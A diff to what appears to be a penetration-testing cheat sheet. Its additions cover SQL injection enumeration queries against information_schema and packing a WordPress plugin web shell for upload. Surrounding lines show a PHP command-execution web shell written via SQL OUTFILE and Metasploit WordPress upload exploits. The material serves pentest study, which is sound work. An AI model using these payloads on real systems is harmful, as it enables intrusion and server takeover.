@@ -462,6 +462,17 @@ console.log("Serialized: \n" + serialize.serialize(y));
 SELECT ("<?php echo system($_GET['cmd']); ?>") INTO OUTFILE "/var/www/html/payload.php"
 ```
 
+### SQL injection using information_schema
+```
+SELECT * FROM information_schema.tables;
+SELECT * FROM information_schema.columns;
+SELECT table_name FROM information_schema.tables
+SELECT column_name FROM information_schema.columns
+```
+
+### Testing sql injection using sqlfiddle
+http://sqlfiddle.com/
+
 ### LDAP Injection
 https://book.hacktricks.xyz/pentesting-web/ldap-injection#special-blind-ldap-injection-without
 
@@ -486,6 +497,15 @@ https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress
 ```
 use exploit/unix/webapp/wp_admin_shell_upload
 use exploit/unix/webapp/wp_slideshowgallery_upload
+```
+
+### Uploading malicious plugin for Wordpress
+```
+Path to the malicious plugin
+/usr/share/SecLists/Web-Shells/WordPress/plugin-shell.php
+
+Packing your plugin
+zip plugin-shell.zip plugin-shell.php
 ```
 
 ### Using xp_cmdshell to run a powershell script on MSSQL (thanks to @sinfulz for recommending this)
@@ -534,3 +554,4 @@ https://gosecure.github.io/unicode-pentester-cheatsheet/
 ### LFI log poisoning (Recommended by 5h4d3)
 
 https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d
+
